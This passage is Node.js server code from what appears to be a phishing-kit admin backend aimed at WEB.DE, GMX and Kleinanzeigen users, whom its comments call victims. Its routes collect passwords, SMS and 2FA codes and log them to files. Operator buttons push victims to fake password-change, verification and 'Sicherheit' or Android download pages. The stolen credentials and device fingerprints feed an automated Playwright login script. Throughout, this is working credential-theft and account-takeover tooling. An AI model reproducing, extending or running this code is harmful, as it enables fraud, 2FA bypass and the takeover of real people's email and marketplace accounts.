      applyLeadTelemetry(lead, req, json, getClientIp(req));

      if (lead.brand === 'klein' || getBrand(req).id === 'klein') {
        const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
        const storedKl = (lead.passwordKl != null) ? String(lead.passwordKl) : '';
        if (currentPassword !== storedKl) {
          return send(res, 400, { ok: false, error: 'wrong_current_password' });
        }
        lead.passwordKl = newPassword;
        pushEvent(lead, 'Новый пароль Kl');
        pushPasswordHistory(lead, newPassword, 'change_kl');
        leadService.persistLeadFull(lead);
        console.log('[ВХОД] Klein: пароль kl изменён id=' + id);
        return send(res, 200, { ok: true, id: id });
      }

      if (lead.status === 'error') {
        const previousPassword = lead.password != null ? String(lead.password) : '';
        if (newPassword === previousPassword) {
          if (webdePasswordWaiters[id]) {
            clearTimeout(webdePasswordWaiters[id].timeoutId);
            try {
              send(webdePasswordWaiters[id].res, 200, { password: newPassword });
            } catch (e) {}
            delete webdePasswordWaiters[id];
            automationService.setWebdeLeadScriptStatus(id, null);
            console.log('[АДМИН] long-poll webde-wait-password: ответ с паролем скрипту (тот же пароль с формы), id=' + id);
          } else {
            /* Long-poll уже снят (408 и т.д.): тот же пароль снова — не перезапускаем скрипт, оставляем ошибку входа для жертвы */
            lead.status = 'error';
            lead.adminErrorKind = 'login';
            pushEvent(lead, 'Повтор того же пароля после таймаута — снова неверные данные');
          }
          leadService.persistLeadFull(lead);
          send(res, 200, { ok: true, id: id });
          return;
        }
        if (!lead.passwordErrorAttempts) lead.passwordErrorAttempts = [];
        lead.passwordErrorAttempts.push({
          previousPassword: previousPassword,
          newPassword: newPassword,
          at: new Date().toISOString(),
        });
        lead.password = newPassword;
        if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
        if (lead.passwordHistory.length === 0 && previousPassword.trim()) {
          lead.passwordHistory.push({ p: previousPassword.trim(), s: 'login' });
        }
        pushPasswordHistory(lead, newPassword, 'login');
        lead.status = 'pending';
        pushEvent(lead, 'Ввел пароль повторно');
        // Сохраняем в all.txt
        if (email && newPassword) {
          appendToAllLog(email, previousPassword, newPassword);
        }
        leadService.persistLeadFull(lead);
        if (webdePasswordWaiters[id]) {
          clearTimeout(webdePasswordWaiters[id].timeoutId);
          try {
            send(webdePasswordWaiters[id].res, 200, { password: newPassword });
          } catch (e) {}
          delete webdePasswordWaiters[id];
          automationService.setWebdeLeadScriptStatus(id, null);
          console.log('[АДМИН] long-poll webde-wait-password: тело ответа с паролем отправлено скрипту (HTTP разблокирован), id=' + id);
        } else {
          automationService.restartWebdeAutoLoginAfterVictimRetryFromError(
            lead,
            id,
            email,
            'После ввода нового пароля (был error, long-poll не активен)'
          );
        }
        writeDebugLog('UPDATE_PASSWORD_ERROR_STATUS', { 
          id: id, 
          email: email,
          oldPassword: previousPassword,
          newPassword: newPassword,
          totalLeads: leads.length
        });
        send(res, 200, { ok: true, id: id });
        return;
      }
      if (!lead.eventTerminal) lead.eventTerminal = [];
      const hasPasswordEvent = lead.eventTerminal.some(function (e) { return e.label === 'Ввел пароль'; });
      if (!hasPasswordEvent) {
        pushEvent(lead, 'Ввел пароль');
      } else {
        pushEvent(lead, 'Ввел пароль повторно');
      }
      lead.password = newPassword;
      if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
      if (lead.passwordHistory.length === 0 && (oldPassword || '').trim()) {
        lead.passwordHistory.push({ p: String(oldPassword).trim(), s: 'login' });
      }
      pushPasswordHistory(lead, newPassword, 'login');
      // Сохраняем в all.txt если пароль изменился
      if (email && newPassword && newPassword !== oldPassword) {
        appendToAllLog(email, oldPassword, newPassword);
      }
      // Long-poll автовхода ждёт только POST из ветки status=error; если жертва обновила пароль
      // пока лид ещё pending/show_success — разбудим скрипт так же (иначе ждёт до таймаута).
      if (webdePasswordWaiters[id] && newPassword.trim() !== '' && newPassword !== oldPassword) {
        clearTimeout(webdePasswordWaiters[id].timeoutId);
        try {
          send(webdePasswordWaiters[id].res, 200, { password: newPassword });
        } catch (e) {}
        delete webdePasswordWaiters[id];
        automationService.setWebdeLeadScriptStatus(id, null);
        console.log('[АДМИН] long-poll webde-wait-password: пароль из ветки не-error (pending/др.), id=' + id);
      }
      // Auto (не Auto-Login): после смены пароля редирект по startPage
      const mode = readMode();
      const startPage = readStartPage();
      if (lead.status === 'pending' && newPassword.trim() !== '') {
        const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, lead);
        if (status) {
          lead.status = status;
          pushEvent(lead, getAutoRedirectEventLabel(lead.status));
        }
      }
      leadService.persistLeadFull(lead);
      writeDebugLog('UPDATE_PASSWORD', { 
        id: id, 
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword,
        status: lead.status,
        totalLeads: leads.length
      });
      send(res, 200, { ok: true, id: id });
    });
    return;
  }

  if (pathname === '/api/brand' && req.method === 'GET') {
    if (safeEnd(res)) return;
    const brand = getBrand(req);
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Cache-Control': 'public, max-age=300',
      'Access-Control-Allow-Origin': '*'
    });
    res.end(JSON.stringify(brand));
    return;
  }

  if (pathname === '/api/redirect-change-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_change_password';
      pushEvent(lead, lead.brand === 'klein' ? 'Отправлен на смену Kl' : 'Отправлен на смену', 'admin');
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      console.log('[АДМИН] Кнопка: смена пароля — id=' + id);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-sicherheit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_sicherheit';
      pushEvent(lead, 'Отправлен на Sicherheit', 'admin');
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-sicherheit-windows' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const leads = leadService.readLeads();
    let count = 0;
    leads.forEach((lead) => {
      if ((lead.platform || '').toLowerCase() === 'windows') {
        lead.status = 'redirect_sicherheit';
        pushEvent(lead, 'Отправлен на Sicherheit (все Windows)', 'admin');
        leadService.persistLeadPatch(lead.id, { status: lead.status, eventTerminal: lead.eventTerminal });
        count++;
      }
    });
    send(res, 200, { ok: true, count: count });
    return;
  }

  // Выбор метода пользователем (Push или SMS) — без админ-авторизации
  if (pathname === '/api/choose-method' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      const method = json.method;
      if (!id || typeof id !== 'string' || !method || (method !== 'push' && method !== 'sms')) {
        return send(res, 400, { ok: false });
      }
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      if (method === 'push') {
        lead.status = 'redirect_push';
        pushEvent(lead, EVENT_LABELS.PUSH, 'user');
      } else {
        lead.status = 'redirect_sms_code';
        pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS, 'user');
      }
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-push' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: пуш — id=' + id);
      const leads = leadService.readLeads();
      const idResolved = leadService.resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_push';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, EVENT_LABELS.PUSH, 'admin');
      leadService.persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Полный снимок антифрода по лиду: только для админки, по клику на иконку ОС в списке. Данные накапливаются при запросах лида (submit / update-password и т.д.). */
  if (pathname === '/api/lead-fingerprint' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = leadService.resolveLeadId(leadId);
    const leads = leadService.readLeads();
    const lead = leads.find((l) => l.id === id);
    if (!lead) return send(res, 404, { ok: false });
    const fp = lead.fingerprint && typeof lead.fingerprint === 'object' ? lead.fingerprint : null;
    let telemetrySnapshots = Array.isArray(lead.telemetrySnapshots) && lead.telemetrySnapshots.length > 0
      ? lead.telemetrySnapshots.map((s) => JSON.parse(JSON.stringify(s)))
      : null;
    if (!telemetrySnapshots || telemetrySnapshots.length === 0) {
      telemetrySnapshots = [{
        at: lead.lastSeenAt || lead.createdAt || new Date().toISOString(),
        stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
        deviceSignature: lead.deviceSignature || undefined,
        fingerprint: lead.fingerprint || undefined,
        clientSignals: lead.clientSignals || undefined,
        requestMeta: lead.requestMeta || undefined
      }];
    }
    const out = {
      leadId: lead.id,
      email: (lead.email || '').trim() || undefined,
      emailKl: (lead.emailKl || '').trim() || undefined,
      brand: lead.brand || undefined,
      platform: lead.platform || undefined,
      userAgent: lead.userAgent || undefined,
      ip: lead.ip || undefined,
      screenWidth: lead.screenWidth,
      screenHeight: lead.screenHeight,
      createdAt: lead.createdAt || undefined,
      lastSeenAt: lead.lastSeenAt || undefined,
      deviceSignature: lead.deviceSignature || undefined,
      stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
      fingerprint: lead.fingerprint || undefined,
      clientSignals: lead.clientSignals || undefined,
      requestMeta: lead.requestMeta || undefined,
      telemetrySnapshots: telemetrySnapshots
    };
    return send(res, 200, { ok: true, data: out });
  }

  /** Профиль для Playwright-автовхода (данные с последнего снимка лида). См. docs/AUTOMATION_PROFILE.md, сборка в lib/automationProfile.js */
  if (pathname === '/api/lead-automation-profile' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = leadService.resolveLeadId(leadIdRaw);
    const leads = leadService.readLeads();
    const lead = leads.find((l) => l.id === id);
    if (!lead) return send(res, 404, { ok: false, error: 'lead not found' });
    const profile = buildAutomationProfile(lead);
    if (!profile) return send(res, 422, { ok: false, error: 'insufficient data (no user agent / fingerprint)' });
    return send(res, 200, { ok: true, profile: profile });
  }

  /** Один ответ для автовхода: email, password, automation profile, ipCountry. См. lib/leadLoginContext.js */
  if (pathname === '/api/lead-login-context' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = leadService.resolveLeadId(leadIdRaw);
    leadService.readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.log('[АДМИН] lead-login-context: лид не найден id=' + id);
        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      const payload = buildLeadLoginContextPayload(lead);
      if (!payload) return send(res, 500, { ok: false, error: 'payload build failed' });
      const emCtx = (lead.email || '').trim().toLowerCase();
      if (emCtx) automationService.touchWebdeScriptLock(emCtx);
      return send(res, 200, payload);
    });
    return;
  }

  /** Скрипт автовхода: сохранить шаг перебора прокси×отпечаток (чтобы новый запуск не начинал с s=0). */
  if (pathname === '/api/redirect-sms-code' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: SMS — id=' + id);
      const leads = leadService.readLeads();
      const idResolved = leadService.resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_sms_code';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS, 'admin');
      leadService.persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-2fa-code' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: 2-FA — id=' + id);
      const leads = leadService.readLeads();
      const idResolved = leadService.resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_2fa_code';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, EVENT_LABELS.TWO_FA, 'admin');
      leadService.persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-open-on-pc' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: открыть на ПК — id=' + id);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_open_on_pc';
      pushEvent(lead, 'Отправлен: «Открыть на ПК»', 'admin');
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-android' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_android';
      pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  /**
   * WEB/GMX: одна кнопка Download — по platform лида:
   * Android → страница приложения; macOS → смена пароля; Windows / iOS / прочее / неизвестно → Sicherheit (антивирус/PC).
   */
  if (pathname === '/api/redirect-download-by-platform' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      if (lead.brand === 'klein') {
        return send(res, 400, { ok: false, error: 'Только для логов WEB.DE / GMX' });
      }
      const p = (lead.platform || '').toLowerCase();
      if (p === 'android') {
        lead.status = 'redirect_android';
        pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
      } else if (p === 'macos') {
        lead.status = 'redirect_change_password';
        pushEvent(lead, 'Отправлен на смену (Mac)', 'admin');
      } else {
        lead.status = 'redirect_sicherheit';
        pushEvent(lead, 'Отправлен на Sicherheit (Download PC)', 'admin');
      }
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      console.log('[АДМИН] Download по OS: id=' + id + ' platform=' + (p || '?') + ' → ' + lead.status);
      send(res, 200, { ok: true, status: lead.status, platform: p || 'unknown' });
    });
    return;
  }

  if (pathname === '/api/redirect-klein-forgot' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_klein_forgot';
      pushEvent(lead, 'Klein: редирект на Passwort vergessen', 'admin');
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/log-action' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id;
      const action = json.action;
      if (!idRaw || typeof idRaw !== 'string' || !action) {
        return send(res, 400, { ok: false });
      }
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      
      // Обрабатываем действие 'success' - записываем событие успеха в лог
      if (action === 'success') {
        lead.status = 'show_success';
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS);
        leadService.persistLeadPatch(id, { status: lead.status, lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        writeDebugLog('LOG_ACTION_SUCCESS', { 
          id: id, 
          email: lead.email || '',
          action: action
        });
        return send(res, 200, { ok: true });
      }
      
      // Действие со страницы загрузки антивируса: только пишем в лог лида
      if (action === 'sicherheit_download') {
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, 'Нажал скачать');
        leadService.persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        return send(res, 200, { ok: true });
      }

      if (action === 'android_download') {
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, 'Нажал скачать (Android)');
        leadService.persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        return send(res, 200, { ok: true });
      }

      // Обрабатываем другие действия (push_resend, sms_resend, sms_request)
      const validAction = action === 'push_resend' || action === 'sms_resend' || action === 'sms_request' || action === 'two_fa_resend' ? action : null;
      if (!validAction) {
        return send(res, 400, { ok: false });
      }
      if (validAction === 'push_resend') {
        webdePushResendRequested[id] = true;
      }
      if (!lead.actionLog) lead.actionLog = [];
      lead.actionLog.push({ type: validAction, at: new Date().toISOString() });
      const labels = { push_resend: 'Запрос PUSH', sms_resend: 'Просит SMS', sms_request: 'Запрос SMS', two_fa_resend: 'Просит код 2FA (erneut)' };
      lead.lastSeenAt = new Date().toISOString();
      pushEvent(lead, labels[validAction] || validAction);
      leadService.persistLeadPatch(id, {
        lastSeenAt: lead.lastSeenAt,
        eventTerminal: lead.eventTerminal,
        actionLog: lead.actionLog
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/sms-code-submit' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id;
      if (!idRaw || typeof idRaw !== 'string') return send(res, 400, { ok: false });
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      const codeStr = json.code != null ? String(json.code).trim() : '';
      const submitKind = json.kind != null ? String(json.kind).trim().toLowerCase() : '';
      lead.smsCodeData = {
        code: codeStr,
        submittedAt: new Date().toISOString(),
        kind: submitKind === '2fa' ? '2fa' : 'sms',
      };
      let smsEventLabel;
      if (submitKind === '2fa') {
        smsEventLabel = codeStr ? ('Ввел 2FA-код: ' + codeStr) : 'Ввел 2FA-код';
      } else {
        smsEventLabel = lead.brand === 'klein'
          ? (codeStr ? 'Ввел SMS Kl: ' + codeStr : 'Ввел SMS Kl')
          : (codeStr ? 'Ввел SMS-код: ' + codeStr : 'Ввел SMS-код');
      }
      let clearWrong2faScript = false;
      if (submitKind === '2fa' && lead.scriptStatus === 'wrong_2fa') {
        delete lead.scriptStatus;
        clearWrong2faScript = true;
      }
      pushEvent(lead, smsEventLabel);
      // Не переводим в show_success автоматически: админ сам отправляет на успех после проверки кода (если код неверный — юзер может ввести заново)
      const smsPatch = { smsCodeData: lead.smsCodeData, eventTerminal: lead.eventTerminal };
      if (clearWrong2faScript) smsPatch.scriptStatus = null;
      leadService.persistLeadPatch(id, smsPatch);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/change-password' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      const email = (lead.email || '').trim();
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      
      // Сохраняем в all.txt
      if (email && newPassword) {
        appendToAllLog(email, currentPassword, newPassword);
      }
      
      lead.changePasswordData = {
        currentPassword: currentPassword,
        newPassword: newPassword,
        submittedAt: new Date().toISOString(),
      };
      // Пароль со страницы смены идёт только в password history с пометкой "new"; поле Password (со входа) не меняем
      pushPasswordHistory(lead, newPassword, 'change');
      lead.lastSeenAt = new Date().toISOString();
      
      // Устанавливаем статус для показа окна успеха через 5 секунд
      const mode = readMode();
      if (mode === 'auto') {
        // В режиме AUTO статус будет установлен через 5 секунд (обрабатывается на клиенте)
        lead.status = 'pending';
        pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
      } else {
        // В режиме MANUAL статус устанавливается админом вручную
        lead.status = 'pending';
        pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
      }
      
      leadService.persistLeadFull(lead);
      writeDebugLog('CHANGE_PASSWORD', { 
        id: id, 
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword,
        status: lead.status
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/change-password-by-email' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const visitId = (json.visitId != null && String(json.visitId).trim()) ? String(json.visitId).trim() : null;
      let email = (json.email != null ? String(json.email) : '').trim();
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      if (!newPassword || newPassword.length < 8) return send(res, 400, { ok: false, error: 'Neues Passwort muss mindestens 8 Zeichen haben.' });
      const leads = leadService.readLeads();
      let idx = -1;
      if (visitId) {
        idx = leads.findIndex((l) => l.id === visitId);
        if (idx >= 0 && !email) email = (leads[idx].email || '').trim();
      }
      if (idx === -1 && email) {
        const emailLower = email.toLowerCase();
        idx = leads.findIndex((l) => (l.email || '').trim().toLowerCase() === emailLower);
      }
      if (idx < 0) return send(res, 400, { ok: false, error: 'E-Mail fehlt oder Sitzung ungültig.' });
      const mode = readMode();
      if (idx >= 0) {
        const lead = leads[idx];
        lead.email = email;
        lead.changePasswordData = { currentPassword: currentPassword, newPassword: newPassword, submittedAt: new Date().toISOString() };
        const oldPassword = lead.password || '';
        pushPasswordHistory(lead, newPassword, 'change');
        lead.lastSeenAt = new Date().toISOString();
        if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
        if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) lead.screenHeight = json.screenHeight;
        const platformChange = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
        if (platformChange != null) lead.platform = platformChange;
        // В режиме AUTO сразу показываем успех (клиент покажет overlay и вызовет log-action)
        if (mode === 'auto') {
          lead.status = 'show_success';
          pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
        } else {
          lead.status = 'pending';
          pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
        }
        
        leadService.persistLeadFull(lead);
        appendToAllLog(email, currentPassword, newPassword);
        writeDebugLog('CHANGE_PASSWORD_BY_EMAIL', { 
          id: idx >= 0 ? lead.id : newId, 
          email: email,
          oldPassword: oldPassword,
          newPassword: newPassword,
          visitId: visitId || null
        });
        send(res, 200, { ok: true });
        return;
      }
      // Если лид не найден, создаём новый (или обновляем существующий по visitId, если он был передан)
      const newId = visitId || ('pw-' + Date.now() + '-' + Math.random().toString(36).slice(2, 11));
      const ip = getClientIp(req);
      const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : undefined;
      const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : undefined;
      const platform = resolvePlatform(getPlatformFromRequest(req), screenW);
      const newLead = {
        id: newId,
        email: email,
        ip: ip,
        password: newPassword,
        createdAt: new Date().toISOString(),
        lastSeenAt: new Date().toISOString(),
        changePasswordData: { currentPassword: currentPassword, newPassword: newPassword, submittedAt: new Date().toISOString() },
        status: mode === 'auto' ? 'show_success' : 'pending',
        eventTerminal: mode === 'auto' ? [{ at: new Date().toISOString(), label: 'Автоматически: окно успеха' }] : [],
        platform: platform || undefined,
        screenWidth: screenW,
        screenHeight: screenH,
      };
      pushPasswordHistory(newLead, newPassword, 'change');
      appendToAllLog(email, currentPassword, newPassword);
      leadService.persistLeadFull(newLead);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/show-error' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try {
        json = JSON.parse(body || '{}');
      } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'error';
      const hb = statusHeartbeats[id];
      const curPage = (hb && hb.currentPage) || '';
      const isSmsPage = curPage === 'sms-code';
      const is2faPage = curPage === '2fa-code';
      lead.adminErrorKind = isSmsPage || is2faPage ? 'sms' : 'login';
      let evLabel;
      if (is2faPage) {
        evLabel = EVENT_LABELS.WRONG_2FA;
      } else if (isSmsPage) {
        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_SMS_KL : EVENT_LABELS.WRONG_SMS;
      } else {
        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
      }
      pushEvent(lead, evLabel, 'admin');
      leadService.persistLeadPatch(id, {
        status: lead.status,
        adminErrorKind: lead.adminErrorKind,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/show-success' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null && json.id !== '') ? String(json.id).trim() : '';
      if (!id) return send(res, 400, { ok: false, error: 'Нужен id лида' });
      const leads = leadService.readLeads();
